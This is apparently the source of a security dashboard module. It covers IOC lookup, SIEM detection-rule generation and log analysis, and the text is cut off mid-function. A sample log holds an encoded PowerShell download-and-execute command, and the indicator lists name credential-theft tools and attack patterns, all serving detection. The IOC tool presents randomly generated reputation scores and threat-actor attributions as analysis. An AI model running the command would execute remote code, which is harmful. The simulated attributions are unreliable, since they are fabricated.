// ═══════════════════════════════════════════════════════════════════════════
// BLUESHELL - Advanced Interactive Features Module
// IOC Search | Log Viewer | Threat Dashboard | Rule Tester | MITRE Map | Policy Gen
// ═══════════════════════════════════════════════════════════════════════════

// ── Shared Utilities ──

let _iocSearchHistory = [];
let _threatDashboardInterval = null;

function _showPageContent() {
    document.getElementById('dashboard').classList.add('hidden');
    const pc = document.getElementById('page-content');
    pc.classList.remove('hidden');
    return pc;
}

function _copyToClipboard(text, btn) {
    navigator.clipboard.writeText(text).then(() => {
        const orig = btn.textContent;
        btn.textContent = 'COPIED';
        setTimeout(() => { btn.textContent = orig; }, 1500);
    }).catch(() => {
        const ta = document.createElement('textarea');
        ta.value = text;
        document.body.appendChild(ta);
        ta.select();
        document.execCommand('copy');
        document.body.removeChild(ta);
        const orig = btn.textContent;
        btn.textContent = 'COPIED';
        setTimeout(() => { btn.textContent = orig; }, 1500);
    });
}

function _codeBlock(code, lang) {
    const id = 'cb_' + Math.random().toString(36).slice(2, 10);
    return `<div style="position:relative;margin:8px 0">
        <button class="btn-hack" onclick="_copyToClipboard(document.getElementById('${id}').textContent,this)" style="position:absolute;top:4px;right:4px;font-size:9px;padding:2px 8px;z-index:1">COPY</button>
        <pre style="background:var(--bg-primary);border:1px solid var(--border);padding:12px;border-radius:4px;overflow-x:auto;font-size:11px;line-height:1.5"><code id="${id}">${_esc(code)}</code></pre>
    </div>`;
}

function _esc(s) {
    return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}

// ═══════════════════════════════════════════════════════════════════════════
// 1. IOC SEARCH & LOOKUP TOOL
// ═══════════════════════════════════════════════════════════════════════════

function _detectIOCType(ioc) {
    ioc = ioc.trim();
    if (/^(\d{1,3}\.){3}\d{1,3}$/.test(ioc)) return 'IPv4';
    if (/^([0-9a-fA-F]{0,4}:){2,7}[0-9a-fA-F]{0,4}$/.test(ioc)) return 'IPv6';
    if (/^[a-fA-F0-9]{32}$/.test(ioc)) return 'MD5';
    if (/^[a-fA-F0-9]{40}$/.test(ioc)) return 'SHA1';
    if (/^[a-fA-F0-9]{64}$/.test(ioc)) return 'SHA256';
    if (/^https?:\/\//i.test(ioc)) return 'URL';
    if (/^[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?(\.[a-zA-Z]{2,})+$/.test(ioc)) return 'Domain';
    return 'Unknown';
}

function _simulateIOCAnalysis(ioc, iocType) {
    const rand = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
    const pick = arr => arr[rand(0, arr.length - 1)];

    const repScore = rand(5, 98);
    const isMalicious = repScore > 60;

    const mitreTechniques = {
        IPv4: ['T1071.001 - Application Layer Protocol: Web', 'T1090 - Proxy', 'T1105 - Ingress Tool Transfer', 'T1573 - Encrypted Channel'],
        IPv6: ['T1071.001 - Application Layer Protocol: Web', 'T1090.003 - Multi-hop Proxy', 'T1572 - Protocol Tunneling'],
        Domain: ['T1071.004 - Application Layer Protocol: DNS', 'T1568.002 - Dynamic Resolution: Domain Generation', 'T1584.001 - Compromise Infrastructure: Domains'],
        MD5: ['T1204.002 - User Execution: Malicious File', 'T1059.001 - PowerShell', 'T1055 - Process Injection'],
        SHA1: ['T1204.002 - User Execution: Malicious File', 'T1027 - Obfuscated Files', 'T1070.004 - Indicator Removal: File Deletion'],
        SHA256: ['T1204.002 - User Execution: Malicious File', 'T1059.003 - Windows Command Shell', 'T1547.001 - Boot or Logon Autostart: Registry Run Keys'],
        URL: ['T1566.002 - Phishing: Spearphishing Link', 'T1204.001 - User Execution: Malicious Link', 'T1189 - Drive-by Compromise'],
        Unknown: ['T1071 - Application Layer Protocol']
    };

    const malwareFamilies = ['Emotet', 'QakBot', 'IcedID', 'Cobalt Strike', 'AsyncRAT', 'AgentTesla', 'RedLine Stealer', 'LockBit 3.0', 'BlackCat/ALPHV', 'Royal Ransomware'];
    const countries = ['Russia', 'China', 'North Korea', 'Iran', 'Brazil', 'Romania', 'Ukraine', 'India', 'Vietnam', 'Netherlands'];
    const threatActors = ['APT28 (Fancy Bear)', 'APT29 (Cozy Bear)', 'Lazarus Group', 'FIN7', 'APT41', 'Sandworm', 'Turla', 'Kimsuky', 'TA505', 'UNC2452'];
    const asns = ['AS16276 OVHcloud', 'AS14061 DigitalOcean', 'AS24940 Hetzner', 'AS13335 Cloudflare', 'AS396982 Google Cloud', 'AS8075 Microsoft Azure'];

    const techniques = (mitreTechniques[iocType] || mitreTechniques['Unknown']).slice(0, rand(2, 3));
    const threatContext = {};

    if (iocType === 'IPv4' || iocType === 'IPv6') {
        threatContext.country = pick(countries);
        threatContext.asn = pick(asns);
        threatContext.reverseHost = ioc.split('.').reverse().join('-') + '.example-rdns.net';
        threatContext.firstSeen = '2025-' + String(rand(1,12)).padStart(2,'0') + '-' + String(rand(1,28)).padStart(2,'0');
        threatContext.lastSeen = '2026-03-' + String(rand(1,30)).padStart(2,'0');
        threatContext.reportCount = rand(3, 280);
    } else if (iocType === 'MD5' || iocType === 'SHA1' || iocType === 'SHA256') {
        threatContext.malwareFamily = pick(malwareFamilies);
        threatContext.fileType = pick(['PE32 Executable', 'Microsoft Word Document', 'JavaScript', 'PowerShell Script', 'DLL Library', 'PDF Document']);
        threatContext.firstSubmission = '2025-' + String(rand(6,12)).padStart(2,'0') + '-' + String(rand(1,28)).padStart(2,'0');
        threatContext.detectionRate = rand(20, 68) + '/72 AV engines';
        threatContext.sandbox = isMalicious ? 'MALICIOUS - Drops payload, contacts C2, creates persistence' : 'CLEAN - No malicious behavior observed';
    } else if (iocType === 'Domain' || iocType === 'URL') {
        threatContext.registrar = pick(['Namecheap', 'GoDaddy', 'Tucows', 'NameSilo', 'Dynadot']);
        threatContext.creationDate = '2025-' + String(rand(1,12)).padStart(2,'0') + '-' + String(rand(1,28)).padStart(2,'0');
        threatContext.hostCountry = pick(countries);
        threatContext.category = isMalicious ? pick(['Phishing', 'Malware Distribution', 'C2 Communication', 'Credential Harvesting']) : 'Uncategorized';
    }

    const relatedIOCs = [];
    for (let i = 0; i < rand(2, 5); i++) {
        const types = ['IPv4', 'Domain', 'SHA256'];
        const t = pick(types);
        if (t === 'IPv4') relatedIOCs.push(rand(10,223) + '.' + rand(0,255) + '.' + rand(0,255) + '.' + rand(1,254));
        else if (t === 'Domain') relatedIOCs.push(pick(['evil','malware','c2','update','cdn','api','dl']) + '-' + rand(100,999) + pick(['.xyz','.top','.ru','.cn','.tk']));
        else relatedIOCs.push(Array.from({length:64}, () => '0123456789abcdef'[rand(0,15)]).join(''));
    }

    return {
        ioc, iocType, repScore, isMalicious, techniques,
        threatContext, relatedIOCs,
        associatedActor: isMalicious ? pick(threatActors) : 'None identified',
        recommendations: isMalicious
            ? ['Block IOC across all security controls immediately', 'Search SIEM for historical connections to this IOC', 'Isolate any endpoints that communicated with this IOC', 'Submit to sandbox for behavioral analysis', 'Update threat intelligence feeds', 'Notify SOC Tier 2 for investigation']
            : ['Continue monitoring', 'Add to watchlist for 30-day observation', 'No immediate action required', 'Correlate with other IOCs if part of an investigation']
    };
}

function _generateDetectionRulesForIOC(ioc, iocType) {
    const rules = {};

    if (iocType === 'IPv4' || iocType === 'IPv6') {
        rules.splunk = `index=* (src_ip="${ioc}" OR dest_ip="${ioc}" OR src="${ioc}" OR dest="${ioc}")
| stats count as Connections, dc(dest_port) as UniquePorts, values(dest_port) as Ports, earliest(_time) as FirstSeen, latest(_time) as LastSeen by src_ip, dest_ip, sourcetype
| eval FirstSeen=strftime(FirstSeen,"%Y-%m-%d %H:%M:%S"), LastSeen=strftime(LastSeen,"%Y-%m-%d %H:%M:%S")
| sort -Connections`;

        rules.sentinel = `let MaliciousIP = "${ioc}";
union CommonSecurityLog, AzureNetworkAnalytics_CL, SigninLogs
| where SourceIP == MaliciousIP or DestinationIP == MaliciousIP or IPAddress == MaliciousIP
| summarize Connections=count(), UniquePorts=dcount(DestinationPort), FirstSeen=min(TimeGenerated), LastSeen=max(TimeGenerated) by SourceIP, DestinationIP, DeviceVendor
| sort by Connections desc`;

        rules.qradar = `SELECT sourceip, destinationip, COUNT(*) as EventCount, MIN(starttime) as FirstSeen, MAX(starttime) as LastSeen
FROM events
WHERE sourceip = '${ioc}' OR destinationip = '${ioc}'
GROUP BY sourceip, destinationip
ORDER BY EventCount DESC
LAST 7 DAYS`;

        rules.elastic = `(source.ip: "${ioc}" OR destination.ip: "${ioc}") | Timeline view: sort by @timestamp`;

        rules.wazuh = `<rule id="100900" level="12">
  <if_group>firewall|ids|web-log</if_group>
  <srcip>${ioc}</srcip>
  <description>Connection detected to known malicious IP: ${ioc}</description>
  <mitre><id>T1071</id></mitre>
  <group>threat_intel,</group>
</rule>`;

        rules.crowdstrike = `Event_SimpleName IN (NetworkConnectIP4, DnsRequest)
| where RemoteAddressIP4 = "${ioc}" OR DomainName CONTAINS "${ioc}"
| stats count by aid, ComputerName, event_simpleName
| sort -count`;

    } else if (iocType === 'Domain' || iocType === 'URL') {
        const searchVal = iocType === 'URL' ? ioc : ioc;
        const domainVal = iocType === 'URL' ? new URL(ioc).hostname : ioc;

        rules.splunk = `index=dns OR index=proxy OR index=web
| search query="${domainVal}" OR url="*${domainVal}*" OR dest="*${domainVal}*"
| stats count as Hits, dc(src_ip) as UniqueClients, values(src_ip) as Clients, earliest(_time) as FirstSeen, latest(_time) as LastSeen by query, sourcetype
| eval FirstSeen=strftime(FirstSeen,"%Y-%m-%d %H:%M:%S"), LastSeen=strftime(LastSeen,"%Y-%m-%d %H:%M:%S")
| sort -Hits`;

        rules.sentinel = `let MaliciousDomain = "${domainVal}";
union DnsEvents, CommonSecurityLog, OfficeActivity
| where Name contains MaliciousDomain or RequestURL contains MaliciousDomain or ClientIP contains MaliciousDomain
| summarize Hits=count(), UniqueClients=dcount(ClientIP), FirstSeen=min(TimeGenerated), LastSeen=max(TimeGenerated) by Name, ClientIP
| sort by Hits desc`;

        rules.qradar = `SELECT sourceip, "DNS Domain", COUNT(*) as QueryCount
FROM events
WHERE "DNS Domain" ILIKE '%${domainVal}%' OR URL ILIKE '%${domainVal}%'
GROUP BY sourceip, "DNS Domain"
ORDER BY QueryCount DESC
LAST 7 DAYS`;

        rules.elastic = `dns.question.name: "*${domainVal}*" OR url.domain: "${domainVal}"`;

        rules.wazuh = `<rule id="100901" level="12">
  <if_group>ossec-dns|web-log</if_group>
  <hostname>${domainVal}</hostname>
  <description>DNS query to known malicious domain: ${domainVal}</description>
  <mitre><id>T1071.004</id></mitre>
  <group>threat_intel,</group>
</rule>`;

        rules.crowdstrike = `Event_SimpleName=DnsRequest
| where DomainName = "${domainVal}" OR DomainName ENDS_WITH ".${domainVal}"
| stats count by aid, ComputerName, DomainName
| sort -count`;

    } else if (iocType === 'MD5' || iocType === 'SHA1' || iocType === 'SHA256') {
        const hashField = iocType.toLowerCase();

        rules.splunk = `index=* (file_hash="${ioc}" OR ${hashField}="${ioc}" OR Hashes="*${ioc}*")
| stats count as Hits, dc(host) as UniqueHosts, values(host) as Hosts, values(file_name) as FileNames, earliest(_time) as FirstSeen, latest(_time) as LastSeen by file_hash, process_name
| eval FirstSeen=strftime(FirstSeen,"%Y-%m-%d %H:%M:%S"), LastSeen=strftime(LastSeen,"%Y-%m-%d %H:%M:%S")
| sort -Hits`;

        rules.sentinel = `union DeviceFileEvents, DeviceProcessEvents, DeviceImageLoadEvents
| where ${iocType} == "${ioc}" or InitiatingProcessSHA256 == "${ioc}"
| summarize Hits=count(), UniqueDevices=dcount(DeviceName), Devices=make_set(DeviceName), FileNames=make_set(FileName) by ${iocType}, InitiatingProcessFileName
| sort by Hits desc`;

        rules.qradar = `SELECT sourceip, "File Hash", "File Name", COUNT(*) as EventCount
FROM events
WHERE "File Hash" = '${ioc}'
GROUP BY sourceip, "File Hash", "File Name"
LAST 7 DAYS`;

        rules.elastic = `file.hash.${hashField}: "${ioc}" OR process.hash.${hashField}: "${ioc}"`;

        rules.wazuh = `<rule id="100902" level="14">
  <if_group>syscheck</if_group>
  <field name="syscheck.${hashField}_after">${ioc}</field>
  <description>Known malicious file hash detected: ${ioc.substring(0,16)}...</description>
  <mitre><id>T1204.002</id></mitre>
  <group>threat_intel,malware,</group>
</rule>`;

        rules.crowdstrike = `Event_SimpleName IN (ProcessRollup2, NewExecutableWritten, ClassifiedModuleLoad)
| where SHA256HashData = "${ioc}" OR MD5HashData = "${ioc}"
| stats count by aid, ComputerName, FileName, FilePath
| sort -count`;
    }

    return rules;
}

function loadIOCSearch() {
    const pc = _showPageContent();
    if (_threatDashboardInterval) { clearInterval(_threatDashboardInterval); _threatDashboardInterval = null; }

    pc.innerHTML = `
        <div style="margin-bottom:24px">
            <div style="display:flex;align-items:center;gap:12px;margin-bottom:8px">
                <h1 style="margin:0;border:none;padding:0">IOC SEARCH & LOOKUP</h1>
                <span class="card-tag" style="position:static">INTEL</span>
            </div>
            <p style="color:var(--text-secondary);font-size:13px">Paste any indicator of compromise for automated analysis, reputation scoring, MITRE mapping, and detection rule generation.</p>
        </div>

        <div style="display:flex;gap:16px">
            <div style="flex:1">
                <div class="section-title">&#x27E6; SEARCH IOC &#x27E7;</div>
                <div style="display:flex;gap:8px;margin-bottom:16px">
                    <input type="text" id="ioc-input" placeholder="Paste IP, domain, hash (MD5/SHA1/SHA256), or URL..." style="flex:1;background:var(--bg-primary);border:1px solid var(--border);color:var(--text-primary);padding:10px 14px;font-family:var(--font-mono);font-size:12px;border-radius:4px;outline:none" onkeydown="if(event.key==='Enter')_runIOCSearch()">
                    <button class="btn-hack" onclick="_runIOCSearch()">ANALYZE</button>
                </div>

                <div id="ioc-results"></div>
            </div>
            <div style="width:260px;flex-shrink:0">
                <div class="section-title">&#x27E6; SEARCH HISTORY &#x27E7;</div>
                <div id="ioc-history" style="max-height:600px;overflow-y:auto">
                    <div style="color:var(--text-dim);font-size:11px;padding:8px">No searches yet.</div>
                </div>
            </div>
        </div>
    `;
}

function _runIOCSearch() {
    const input = document.getElementById('ioc-input');
    const ioc = input.value.trim();
    if (!ioc) return;

    const iocType = _detectIOCType(ioc);
    const analysis = _simulateIOCAnalysis(ioc, iocType);

    _iocSearchHistory.unshift({ ioc, iocType, score: analysis.repScore, time: new Date().toISOString().substring(11, 19) });
    if (_iocSearchHistory.length > 50) _iocSearchHistory.pop();

    _renderIOCHistory();
    _renderIOCResults(analysis);
}

function _renderIOCHistory() {
    const el = document.getElementById('ioc-history');
    if (!el) return;
    el.innerHTML = _iocSearchHistory.map(h => {
        const color = h.score > 60 ? 'var(--accent-red)' : h.score > 30 ? 'var(--accent-yellow)' : 'var(--accent)';
        return `<div style="padding:6px 8px;border-bottom:1px solid var(--border);cursor:pointer;font-size:11px" onclick="document.getElementById('ioc-input').value='${_esc(h.ioc)}';_runIOCSearch()">
            <div style="display:flex;justify-content:space-between;align-items:center">
                <span style="color:${color}">${h.score}</span>
                <span style="color:var(--text-dim)">${h.time}</span>
            </div>
            <div style="color:var(--text-secondary);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-top:2px">${_esc(h.ioc)}</div>
            <div style="color:var(--text-dim);font-size:9px">${h.iocType}</div>
        </div>`;
    }).join('');
}

function _renderIOCResults(a) {
    const el = document.getElementById('ioc-results');
    const scoreColor = a.repScore > 60 ? 'var(--accent-red)' : a.repScore > 30 ? 'var(--accent-yellow)' : 'var(--accent)';
    const verdict = a.isMalicious ? 'MALICIOUS' : 'SUSPICIOUS / CLEAN';
    const verdictColor = a.isMalicious ? 'var(--accent-red)' : 'var(--accent)';

    let contextHtml = '';
    const ctx = a.threatContext;
    if (a.iocType === 'IPv4' || a.iocType === 'IPv6') {
        contextHtml = `
            <tr><td style="color:var(--text-dim);width:140px">Country</td><td>${ctx.country}</td></tr>
            <tr><td style="color:var(--text-dim)">ASN</td><td>${ctx.asn}</td></tr>
            <tr><td style="color:var(--text-dim)">Reverse DNS</td><td>${ctx.reverseHost}</td></tr>
            <tr><td style="color:var(--text-dim)">First Seen</td><td>${ctx.firstSeen}</td></tr>
            <tr><td style="color:var(--text-dim)">Last Seen</td><td>${ctx.lastSeen}</td></tr>
            <tr><td style="color:var(--text-dim)">Reports</td><td>${ctx.reportCount} abuse reports</td></tr>`;
    } else if (a.iocType === 'MD5' || a.iocType === 'SHA1' || a.iocType === 'SHA256') {
        contextHtml = `
            <tr><td style="color:var(--text-dim);width:140px">Malware Family</td><td style="color:var(--accent-red)">${ctx.malwareFamily}</td></tr>
            <tr><td style="color:var(--text-dim)">File Type</td><td>${ctx.fileType}</td></tr>
            <tr><td style="color:var(--text-dim)">First Submission</td><td>${ctx.firstSubmission}</td></tr>
            <tr><td style="color:var(--text-dim)">Detection Rate</td><td>${ctx.detectionRate}</td></tr>
            <tr><td style="color:var(--text-dim)">Sandbox Result</td><td>${ctx.sandbox}</td></tr>`;
    } else if (a.iocType === 'Domain' || a.iocType === 'URL') {
        contextHtml = `
            <tr><td style="color:var(--text-dim);width:140px">Registrar</td><td>${ctx.registrar}</td></tr>
            <tr><td style="color:var(--text-dim)">Created</td><td>${ctx.creationDate}</td></tr>
            <tr><td style="color:var(--text-dim)">Host Country</td><td>${ctx.hostCountry}</td></tr>
            <tr><td style="color:var(--text-dim)">Category</td><td>${ctx.category}</td></tr>`;
    }

    el.innerHTML = `
        <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:6px;padding:20px;margin-bottom:16px">
            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px">
                <div>
                    <div style="font-size:10px;color:var(--text-dim);margin-bottom:4px">INDICATOR OF COMPROMISE</div>
                    <div style="font-size:14px;color:var(--accent-blue);word-break:break-all">${_esc(a.ioc)}</div>
                </div>
                <div style="text-align:center">
                    <div style="font-size:36px;font-weight:700;color:${scoreColor}">${a.repScore}</div>
                    <div style="font-size:9px;color:var(--text-dim)">REPUTATION</div>
                </div>
            </div>
            <div style="display:flex;gap:12px;flex-wrap:wrap;margin-bottom:16px">
                <span class="card-tag" style="position:static">${a.iocType}</span>
                <span class="card-tag" style="position:static;background:${verdictColor};color:#000">${verdict}</span>
                <span class="card-tag" style="position:static">${a.associatedActor}</span>
            </div>
        </div>

        <div class="section-title">&#x27E6; MITRE ATT&CK TECHNIQUES &#x27E7;</div>
        <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:6px;padding:12px;margin-bottom:16px">
            ${a.techniques.map(t => `<div style="padding:4px 0;font-size:12px"><span style="color:var(--accent-yellow)">&#x25B8;</span> ${t}</div>`).join('')}
        </div>

        <div class="section-title">&#x27E6; THREAT CONTEXT &#x27E7;</div>
        <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:6px;padding:12px;margin-bottom:16px">
            <table style="width:100%;font-size:12px">${contextHtml}</table>
        </div>

        <div class="section-title">&#x27E6; RELATED IOCs &#x27E7;</div>
        <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:6px;padding:12px;margin-bottom:16px">
            ${a.relatedIOCs.map(r => `<div style="padding:3px 0;font-size:11px;color:var(--accent-blue);cursor:pointer;word-break:break-all" onclick="document.getElementById('ioc-input').value='${_esc(r)}';_runIOCSearch()">${_esc(r)}</div>`).join('')}
        </div>

        <div class="section-title">&#x27E6; RECOMMENDATIONS &#x27E7;</div>
        <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:6px;padding:12px;margin-bottom:16px">
            ${a.recommendations.map((r,i) => `<div style="padding:3px 0;font-size:12px"><span style="color:var(--accent)">${i+1}.</span> ${r}</div>`).join('')}
        </div>

        <div class="section-title">&#x27E6; DETECTION RULES &#x27E7;</div>
        <button class="btn-hack" onclick="_showIOCDetectionRules('${_esc(a.ioc)}','${a.iocType}')" style="margin-bottom:12px">GENERATE DETECTION RULES FOR ALL PLATFORMS</button>
        <div id="ioc-detection-rules"></div>
    `;
}

function _showIOCDetectionRules(ioc, iocType) {
    const rules = _generateDetectionRulesForIOC(ioc, iocType);
    const el = document.getElementById('ioc-detection-rules');
    const platforms = [
        { key: 'splunk', name: 'Splunk (SPL)' },
        { key: 'sentinel', name: 'Microsoft Sentinel (KQL)' },
        { key: 'qradar', name: 'IBM QRadar (AQL)' },
        { key: 'elastic', name: 'Elastic SIEM' },
        { key: 'wazuh', name: 'Wazuh (XML)' },
        { key: 'crowdstrike', name: 'CrowdStrike Falcon' }
    ];

    el.innerHTML = platforms.filter(p => rules[p.key]).map(p =>
        `<div style="margin-bottom:12px">
            <div style="font-size:11px;color:var(--accent);margin-bottom:4px">${p.name}</div>
            ${_codeBlock(rules[p.key], p.key)}
        </div>`
    ).join('');
}


// ═══════════════════════════════════════════════════════════════════════════
// 2. LOG VIEWER / ANALYZER
// ═══════════════════════════════════════════════════════════════════════════

const _sampleLogs = {
    'Windows Event 4625 (Failed Logon)': `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
    <EventID>4625</EventID>
    <Version>0</Version>
    <Level>0</Level>
    <Task>12544</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8010000000000000</Keywords>
    <TimeCreated SystemTime="2026-03-29T14:23:17.4820000Z"/>
    <EventRecordID>1248901</EventRecordID>
    <Computer>DC01.corp.local</Computer>
  </System>
  <EventData>
    <Data Name="SubjectUserSid">S-1-0-0</Data>
    <Data Name="SubjectUserName">-</Data>
    <Data Name="TargetUserName">administrator</Data>
    <Data Name="TargetDomainName">CORP</Data>
    <Data Name="Status">0xC000006D</Data>
    <Data Name="SubStatus">0xC000006A</Data>
    <Data Name="LogonType">10</Data>
    <Data Name="IpAddress">192.168.1.105</Data>
    <Data Name="IpPort">49832</Data>
    <Data Name="WorkstationName">ATTACKER-PC</Data>
  </EventData>
</Event>`,

    'Windows Event 4688 (Process Creation)': `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
    <EventID>4688</EventID>
    <Version>2</Version>
    <Level>0</Level>
    <Task>13312</Task>
    <TimeCreated SystemTime="2026-03-29T15:01:44.2910000Z"/>
    <EventRecordID>1249102</EventRecordID>
    <Computer>WS042.corp.local</Computer>
  </System>
  <EventData>
    <Data Name="SubjectUserName">jsmith</Data>
    <Data Name="SubjectDomainName">CORP</Data>
    <Data Name="NewProcessName">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
    <Data Name="CommandLine">powershell.exe -nop -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAyADAAMAAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA</Data>
    <Data Name="ParentProcessName">C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE</Data>
    <Data Name="TokenElevationType">%%1936</Data>
  </EventData>
</Event>`,

    'Syslog Firewall Deny': `Mar 29 14:15:22 fw01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:1a:2b:3c:4d:5e:6f SRC=203.0.113.50 DST=10.0.1.25 LEN=44 TOS=0x00 PREC=0x00 TTL=45 ID=54321 PROTO=TCP SPT=44831 DPT=22 WINDOW=1024 RES=0x00 SYN URGP=0
Mar 29 14:15:23 fw01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:1a:2b:3c:4d:5e:6f SRC=203.0.113.50 DST=10.0.1.25 LEN=44 TOS=0x00 PREC=0x00 TTL=45 ID=54322 PROTO=TCP SPT=44832 DPT=23 WINDOW=1024 RES=0x00 SYN URGP=0
Mar 29 14:15:23 fw01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:1a:2b:3c:4d:5e:6f SRC=203.0.113.50 DST=10.0.1.25 LEN=44 TOS=0x00 PREC=0x00 TTL=45 ID=54323 PROTO=TCP SPT=44833 DPT=80 WINDOW=1024 RES=0x00 SYN URGP=0
Mar 29 14:15:24 fw01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:1a:2b:3c:4d:5e:6f SRC=203.0.113.50 DST=10.0.1.25 LEN=44 TOS=0x00 PREC=0x00 TTL=45 ID=54324 PROTO=TCP SPT=44834 DPT=443 WINDOW=1024 RES=0x00 SYN URGP=0
Mar 29 14:15:24 fw01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:1a:2b:3c:4d:5e:6f SRC=203.0.113.50 DST=10.0.1.25 LEN=44 TOS=0x00 PREC=0x00 TTL=45 ID=54325 PROTO=TCP SPT=44835 DPT=3389 WINDOW=1024 RES=0x00 SYN URGP=0`,

    'CEF Format Alert': `CEF:0|Fortinet|FortiGate|7.2.4|0419016384|utm:ips signature|7|src=198.51.100.77 dst=10.0.2.50 spt=52443 dpt=443 proto=6 act=dropped app=HTTPS msg=signatures.daily.ips: Exploit.Apache.Log4j.Error.Message.Remote.Code.Execution cat=intrusion-prevention externalId=1920481 rt=Mar 29 2026 14:30:05 deviceInboundInterface=port1 deviceOutboundInterface=port2 cs1=IPS cs1Label=subtype cs2=signature cs2Label=type cn1=7 cn1Label=severity
CEF:0|Fortinet|FortiGate|7.2.4|0419016384|utm:ips signature|9|src=198.51.100.77 dst=10.0.2.51 spt=52444 dpt=8080 proto=6 act=dropped app=HTTP msg=signatures.daily.ips: Exploit.Spring4Shell.Remote.Code.Execution cat=intrusion-prevention externalId=1920482 rt=Mar 29 2026 14:30:06 cn1=9 cn1Label=severity
CEF:0|CrowdStrike|FalconHost|6.47|DetectionSummaryEvent|Critical|10|src=10.0.3.100 dst=185.220.100.252 suser=jdoe fileName=mimikatz.exe filePath=C:\\Users\\jdoe\\Downloads\\ msg=Credential theft tool detected cat=malware cs1=Credential Access cs1Label=tactic`,

    'JSON CloudTrail Event': `{"eventVersion":"1.08","userIdentity":{"type":"IAMUser","principalId":"AIDA6EXAMPLE","arn":"arn:aws:iam::123456789012:user/suspicious-user","accountId":"123456789012","userName":"suspicious-user"},"eventTime":"2026-03-29T14:45:22Z","eventSource":"iam.amazonaws.com","eventName":"CreateAccessKey","awsRegion":"us-east-1","sourceIPAddress":"198.51.100.50","userAgent":"aws-cli/2.15.0 Python/3.11.6","requestParameters":{"userName":"admin"},"responseElements":{"accessKey":{"accessKeyId":"AKIA6EXAMPLE","status":"Active","userName":"admin"}},"eventID":"a1b2c3d4-e5f6-7890-abcd-ef1234567890","eventType":"AwsApiCall","recipientAccountId":"123456789012"}
{"eventVersion":"1.08","userIdentity":{"type":"IAMUser","principalId":"AIDA6EXAMPLE","arn":"arn:aws:iam::123456789012:user/suspicious-user","accountId":"123456789012","userName":"suspicious-user"},"eventTime":"2026-03-29T14:45:30Z","eventSource":"s3.amazonaws.com","eventName":"GetBucketAcl","awsRegion":"us-east-1","sourceIPAddress":"198.51.100.50","userAgent":"aws-cli/2.15.0 Python/3.11.6","requestParameters":{"bucketName":"company-sensitive-data","acl":""},"eventID":"b2c3d4e5-f6a7-8901-bcde-f12345678901","eventType":"AwsApiCall","recipientAccountId":"123456789012"}
{"eventVersion":"1.08","userIdentity":{"type":"IAMUser","principalId":"AIDA6EXAMPLE","arn":"arn:aws:iam::123456789012:user/suspicious-user","accountId":"123456789012","userName":"suspicious-user"},"eventTime":"2026-03-29T14:46:01Z","eventSource":"ec2.amazonaws.com","eventName":"DescribeInstances","awsRegion":"us-east-1","sourceIPAddress":"198.51.100.50","userAgent":"aws-cli/2.15.0 Python/3.11.6","eventID":"c3d4e5f6-a7b8-9012-cdef-123456789012","eventType":"AwsApiCall","recipientAccountId":"123456789012"}`
};

const _suspiciousIndicators = {
    processes: ['powershell.exe', 'cmd.exe', 'wscript.exe', 'cscript.exe', 'mshta.exe', 'certutil.exe', 'bitsadmin.exe', 'regsvr32.exe', 'rundll32.exe', 'mimikatz.exe', 'procdump.exe', 'psexec.exe', 'wmic.exe', 'net.exe', 'whoami.exe', 'nltest.exe'],
    commandPatterns: ['-enc ', '-nop ', '-w hidden', 'downloadstring', 'invoke-expression', 'iex ', 'bypass', 'frombase64', 'new-object net.webclient', '-noprofile'],
    ips: ['203.0.113.', '198.51.100.', '185.220.100.', '45.33.32.'],
    events: ['4625', '4672', '4688', '4697', '4698', '4720', '1102', '7045'],
    awsActions: ['CreateAccessKey', 'DeleteTrail', 'StopLogging', 'PutBucketPolicy', 'CreateLoginProfile', 'UpdateAssumeRolePolicy', 'AttachUserPolicy'],
    cvePatterns: ['Log4j', 'Spring4Shell', 'ProxyShell', 'ProxyLogon', 'EternalBlue', 'ZeroLogon']
};

function _detectLogFormat(text) {
    text = text.trim();
    if (text.startsWith('<Event') || text.includes('EventID>')) return 'Windows Event XML';
    if (text.startsWith('{') || text.startsWith('[')) {
        try { JSON.parse(text.split('\n')[0]); return 'JSON'; } catch(e) {}
    }
    if (text.startsWith('CEF:')) return 'CEF';
    if (/^[A-Z][a-z]{2}\s+\d{1,2}\s+\d{2}:\d{2}:\d{2}/.test(text)) return 'Syslog';
    if (text.includes(',') && text.split('\n')[0].split(',').length > 3) return 'CSV';
    return 'Unknown';
}

function _parseAndAnalyzeLogs(text) {
    const format = _detectLogFormat(text);
    const lines = text.trim().split('\n');
    const findings = [];
    const mitreMap = [];

    const lowerText = text.toLowerCase();

    // Check for suspicious processes
    _suspiciousIndicators.processes.forEach(proc => {
        if (lowerText.includes(proc.toLowerCase())) {
            findings.push({ severity: 'high', finding: `Suspicious process detected: ${proc}` });
        }
    });

    // Check for suspicious command patterns
